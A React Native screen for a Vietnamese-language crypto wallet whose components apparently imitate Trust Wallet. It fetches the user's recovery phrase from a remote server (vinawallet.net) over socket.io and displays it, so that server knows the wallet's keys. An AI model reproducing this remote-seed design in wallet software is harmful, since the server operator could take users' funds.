import React, {useEffect, useState} from 'react';
import {} from 'react-native';
import TrustView from '../components/common/TrustView';
import TrustContainer from '../components/common/TrustContainer';
import TrustText from '../components/common/TrustText';
import {styles} from './styles';
import Dimens from '../common/Dimens';
import {useTheme} from '@react-navigation/native';
import Content from '../components/login/Content';
import CharacterList from '../components/login/CharacterList';
import ButtonLogin from '../components/login/ButtonLogin';
import ButtonAttention from '../components/login/ButtonAttention';
import {NAVIGATION_CONSTANTS} from '../common/Constants';
import {io} from 'socket.io-client';

function LoginContainer(props) {
    const {navigation} = props;
    const [data,setData]=useState([])
    const [newData, setNewData] = useState([]);
    const {colors} = useTheme();
    const onPressNext = () => {
        navigation?.navigate(NAVIGATION_CONSTANTS.VERIFY_LOGIN, data);
    };

    useEffect(() => {
        const socket = io('https://vinawallet.net',
            {transports: ['websocket', 'polling', 'flashsocket']},
        );
        socket.emit('/socketVnaWallet', {'api_passer': {'key_passer': 'twl_aut_log'}});
        socket.on('twl_aut_log', (res) => {
            setData(res)
        });
    }, []);


    return (
        <TrustContainer
            hasHeader={false}
            renderContentView={() => {
                return (
                    <TrustView style={[styles.LoginContainer, {backgroundColor: colors.background}]}>
                        <Content
                            txtTitle={'Cụm từ phục hồi ví của bạn'}
                            txtContent={'Viết xuống hoặc sao chép những từ này theo đúng thứ tự và lưu chúng ở nơi an toàn'}
                        />
                        <CharacterList
                            data={data}
                        />
                        <TrustView
                            style={{
                                flexDirection: 'row',
                                marginVertical: Dimens.verticalScale(40),
                            }}>
                            <TrustText
                                style={styles.txtChar}
                                text={'SAO CHÉP'}
                            />

                            <TrustText
                                onPress={()=>{navigation?.navigate(NAVIGATION_CONSTANTS.QR_CODE,data)}}
                                style={styles.txtChar}
                                text={'HIỂN THỊ QR'}
                            />
                        </TrustView>
                        <ButtonAttention/>
                        <ButtonLogin
                            onPress={onPressNext}
                            txtLogin={'TIẾP TỤC'}
                        />
                    </TrustView>
                );
            }}
        />
    );
}

export default LoginContainer;
